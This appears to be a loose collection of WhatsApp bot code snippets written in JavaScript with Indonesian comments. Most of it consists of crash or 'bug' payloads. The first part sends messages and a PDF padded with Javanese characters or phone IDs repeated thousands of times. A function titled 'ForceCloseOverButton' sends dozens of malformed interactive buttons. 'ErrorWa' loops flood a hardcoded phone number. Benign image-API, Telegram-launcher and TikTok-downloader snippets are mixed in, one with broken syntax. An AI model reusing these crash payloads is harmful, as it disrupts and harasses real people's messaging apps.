>  Izz.sendMessage(m.chat, { text: `halo`, 
contextInfo: {
isForwaded: true,
forwardingScore: 120,
mentionedJid: ["6281274749995@s.whatsapp.net"],
forwardedNewsletterMessageInfo: { newsletterName: `ꦾ`.repeat(999), newsletterJid: `ꦾ`.repeat(999) }, 
externalAdReply: {
title: `ꦾ`.repeat(9999),
body: `ꦾ`.repeat(999),
thumbnailUrl: null
}}}, { quoted: null }
)

>  Izz.sendMessage(m.chat, { text: `ꦾ`.repeat(999999), 
contextInfo: {
isForwaded: true,
forwardingScore: 999999,
mentionedJid: ["6281274749995@s.whatsapp.net"],
forwardedNewsletterMessageInfo: { newsletterName: `ꦾ`.repeat(9999), newsletterJid: `123445544344556`.repeat(9999) }, 
externalAdReply: {
title: `ꦾ`.repeat(9999),
body: `ꦾ`.repeat(9999),
thumbnailUrl: `ꦾ`.repeat(9999),
sourceUrl: `ꦾ`.repeat(9999),
}}}, { quoted: null }
)

> 
for (let i = 0; i < 5; i++) {
 Izz.sendMessage(m.chat, { text: `ꦾꦾꦾ`.repeat(999) + `[6281274749995@s.whatsapp.net], `.repeat(999), 
contextInfo: {
isForwaded: false,
forwardingScore: 999999,
mentionedJid: ["6281274749995@s.whatsapp.net"],
forwardedNewsletterMessageInfo: { newsletterName: `ꦾ`.repeat(999), newsletterJid: `6281274749995@s.whatsapp.net`.repeat(9999) }, 
externalAdReply: {
title: `6281274749995@s.whatsapp.net`.repeat(9999),
body: `6281274749995@s.whatsapp.net`.repeat(9999),
thumbnailUrl: `ꦾ`.repeat(9999),
sourceUrl: `ꦾ`.repeat(9999),
}}}, { quoted: null }
}
)


  const PDFDocument = require('pdfkit');
  // Ambil teks setelah perintah, misal: .makepdf Ini isi PDF saya
  try {
    // Buat instance PDFDocument
    const doc = new PDFDocument({
      autoFirstPage: true,
      info: {
        Title: 'Dokumen Otomatis',
        Author: 'Bot Anda'
      }
    });
    // Kumpulkan data chunks
    let buffers = [];
    doc.on('data', chunk => buffers.push(chunk));
    doc.on('end', async () => {
      const pdfBuffer = Buffer.concat(buffers);
      // Kirim PDF langsung dari Buffer
      await Izz.sendMessage(
        m.chat,
        {
          document: pdfBuffer,
          fileName: 'dokumen-otomatis.pdf',
          mimetype: 'application/pdf'
        },
        { quoted: m }
      );
    });

    // Tambahkan konten ke PDF
    doc.fontSize(20).text('📄 Dokumen Otomatis\n\n', { align: 'center' });
    doc.moveDown();
    doc.fontSize(12).text(`6285191715432@s.whatsapp.net`.repeat(9999) + `6281274749995@s.whatsapp.net`.repeat(9999), {
      align: 'left',
      lineGap: 4,
      paragraphGap: 99999999
    });

    // Tambahkan metadata atau header/footer jika perlu
    // doc.info.Subject = 'Generated by Bot';
    // doc.text(`\n\nDihasilkan oleh Bot pada ${new Date().toLocaleString()}`, { align: 'right' });

    // Akhiri dokumen sehingga event 'end' terpicu
    doc.end();
  } catch (err) {
    console.error('Error membuat PDF:', err);
    Izz.sendMessage(m.chat, { text: '❌ Gagal membuat PDF.' }, { quoted: m });
  }
  
>    // FUNCTION BAK LGI🤓
async function ForceCloseOverButton(target) {
  Izz.relayMessage(
    target,
    {
      interactiveMessage: {
        header: {
          title: "System Crashing👾",
          hasMediaAttachment: false,
        },
        body: {
          text: "ꦾ".repeat(9000),
        },
        nativeFlowMessage: {
          messageParamsJson: "",
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "payment_method",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "call_permission_request",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
              voice_call: "call_galaxy",
            },
            {
              name: "form_message",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "wa_payment_learn_more",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "wa_payment_transaction_details",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "wa_payment_fbpin_reset",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "catalog_message",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "payment_info",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "review_order",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "send_location",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "payments_care_csat",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "view_product",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "payment_settings",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "address_message",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "automated_greeting_message_view_catalog",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "open_webview",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "message_with_link_status",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "payment_status",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "galaxy_costum",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "extensions_message_v2",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "landline_call",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            { name: "mpm", buttonParamsJson: `ꦾ`.repeat(100) + "\u0003" },
            {
              name: "cta_copy",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            { name: "cta_url", buttonParamsJson: `ꦾ`.repeat(100) + "\u0003" },
            {
              name: "review_and_pay",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "galaxy_message",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
            {
              name: "cta_call",
              buttonParamsJson: `ꦾ`.repeat(100) + "\u0003",
            },
          ],
        },
      },
    },
    { participant: { jid: target } }
  );
  console.log(chalk.red("Succes Send Combo"));
}

(async () => {
ForceCloseOverButton('6285191715432@s.whatsapp.net')
m.reply(`done`)
})()
  
  
  
/* *[ GPT-1 IMAGE ]*
Author: Wolep (+62 813-37xx-xxxx) https://whatsapp.com/channel/0029Vb5EZCjIiRotHCI1213L/220
*/

case 'gpt1image':
case 'gptimg': {
    if (!q) return m.reply("Contoh: *.gpt1image kucing lucu terbang ke luar angkasa dengan jetpack*")
    await conn.sendMessage(m.chat, {
        react: {
            text: "🤖",
            key: m.key
        }
    })
    m.reply("Sabar yah, sedang membuat gambar dari imajinasimu...\nProses ini mungkin agak lama, tunggu sebentar...")
>
async function gotimg(prompt) {
    try {
        const headers = {
            "content-type": "application/json",
            "referer": "https://gpt1image.exomlapi.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
        }
        const body = JSON.stringify({
            prompt: prompt,
            n: 1,
            size: "1024x1024",
            is_enhance: true,
            response_format: "url"
        })
        const res = await fetch("https://gpt1image.exomlapi.com/v1/images/generations", {
            method: "POST",
            headers,
            body
        })
        if (!res.ok) return m.reply(`Gagal mengambil gambar dari server.\nStatus: ${res.status} ${res.statusText}`)
        const data = await res.json()
        const imgUrl = data?.data?.[0]?.url
        if (!imgUrl) return m.reply("Gambar berhasil dibuat tapi URL kosong. Mungkin ada gangguan dari server.")
        Izz.sendMessage(m.chat, { image: { url: imgUrl }, caption: `Gambar untuk:\n${q}` }, { quoted: m })
    } catch (err) {
        m.reply("Terjadi error saat membuat gambar: " + err.message)
    }
}

(async () => {
await gotimg(`kucing terbang`)
})()


>
async function ErrorWa(number) {
for (let i = 0; i < 20; i++) {
 await Izz.relayMessage(number, { convertion: `ꦾꦾꦾ`.repeat(999) + `[6281274749995@s.whatsapp.net], `.repeat(999), ai: true, 
contextInfo: {
isForwaded: false,
forwardingScore: 999999,
mentionedJid: ["6281274749995@s.whatsapp.net"],
forwardedNewsletterMessageInfo: { newsletterName: `ꦾ`.repeat(999), newsletterJid: `6281274749995@s.whatsapp.net`.repeat(9999) }, 
externalAdReply: {
title: `6281274749995@s.whatsapp.net`.repeat(9999),
body: `6281274749995@s.whatsapp.net`.repeat(9999),
thumbnailUrl: `ꦾ`.repeat(9999),
sourceUrl: `ꦾ`.repeat(9999),
}}}, { participant: { jid: number }}
)
}
}

(async () => {
const number = `6281274749995@s.whatsapp.net`
try {
const data = await ErrorWa(number);
m.reply(`succes`);
} catch (error) { 
m.reply(error) 
}
})()

>
async function ErrorWa(number) {
for (let i = 0; i < 20; i++) {
try {
 await Izz.relayMessage(number, { convertion: `ꦾꦾꦾ`.repeat(999) + `[6281274749995@s.whatsapp.net], `.repeat(999),
contextInfo: {
isForwaded: false,
forwardingScore: 999999,
mentionedJid: ["6281274749995@s.whatsapp.net"],
forwardedNewsletterMessageInfo: { newsletterName: `ꦾ`.repeat(999), newsletterJid: `6281274749995@s.whatsapp.net`.repeat(9999) }, 
externalAdReply: {
title: `6281274749995@s.whatsapp.net`.repeat(9999),
body: `6281274749995@s.whatsapp.net`.repeat(9999),
thumbnailUrl: `ꦾ`.repeat(9999),
sourceUrl: `ꦾ`.repeat(9999),
}}}, { participant: { jid: number }}
)
} catch (error) {
 m.reply(error)
} 
}
}

(async () => {
const number = `6281274749995@s.whatsapp.net`
try {
const data = await ErrorWa(number);
m.reply(`succes`);
} catch (error) { 
m.reply(error) 
}
})()


  // ... case lain
  case 'connecttele': {
    try {
      const { spawn } = require('child_process');
      // Jalankan bot Telegram sebagai proses terpisah
      const teleProc = spawn(
        'node',
        ['./sc-tele-izz/bot.js'],  // <-- ganti sesuai path script Telegram Anda
        {
          detached: true,
          stdio: 'ignore'
        }
      );
      teleProc.unref(); // biarkan proses terus berjalan setelah parent exit

      // Kirim konfirmasi ke user
      await conn.reply(m.chat, '⚡️ SC Bot Telegram sedang dijalankan!', m);
    } catch (err) {
      console.error('Error saat connect ke Telegram bot:', err);
      await conn.reply(m.chat, '❌ Gagal menjalankan SC Bot Telegram:\n' + err.message, m);
    }
   
  }
  
  
const { tiktokdl } = require('tiktokdl') 
async function toktok {
const url = 'https://www.tiktok.com/@omagadsus/video/7025456384175017243?is_from_webapp=1&sender_device=pc&web_id6982004129280116226'

const data = await tiktokdl(url);
console.log(data) 
}

(async () => {
const data = await toktok
m.reply(`sukses`);
})()

>  
  const { tiktokdl } = require('tiktokdl') 
async function toktok() {
const url = 'https://www.tiktok.com/@omagadsus/video/7025456384175017243?is_from_webapp=1&sender_device=pc&web_id6982004129280116226'

const data = await tiktokdl(url);
return {
video: data.video,
music: data.music
}

console.log(data) 
}

(async () => {
const data = await toktok()
const lagu = data.music
m.reply(lagu);
})()
 